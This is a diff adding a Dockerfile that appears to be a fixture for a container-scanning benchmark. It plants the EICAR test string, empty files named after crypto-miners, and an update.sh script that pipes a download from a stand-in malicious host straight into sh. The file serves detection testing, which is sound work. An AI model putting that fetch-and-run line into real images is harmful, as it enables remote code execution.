@@ -1,0 +1,23 @@
+# BENCH-CONT-015: Malicious artifact embedded in container image
+# Tests: Malicious artifact detection
+# Embeds the EICAR anti-malware test string (industry standard test file)
+# and a file mimicking a crypto-miner binary name.
+
+FROM alpine:3.18
+
+WORKDIR /app
+
+# Embed the EICAR test string (standard anti-malware test file)
+# This is NOT actual malware — it's the industry-standard test string
+# recognized by all AV/malware scanners as a test signature.
+RUN echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /app/eicar_test.txt
+
+# Create a file with a name matching known crypto-miner binaries
+RUN echo '#!/bin/sh' > /app/xmrig && chmod +x /app/xmrig
+RUN echo '#!/bin/sh' > /app/minerd && chmod +x /app/minerd
+
+# Create a suspicious script that downloads from an external source
+RUN echo '#!/bin/sh\ncurl -s http://malicious-site.example.com/payload.sh | sh' > /app/update.sh && \
+    chmod +x /app/update.sh
+
+ENTRYPOINT ["/bin/sh"]
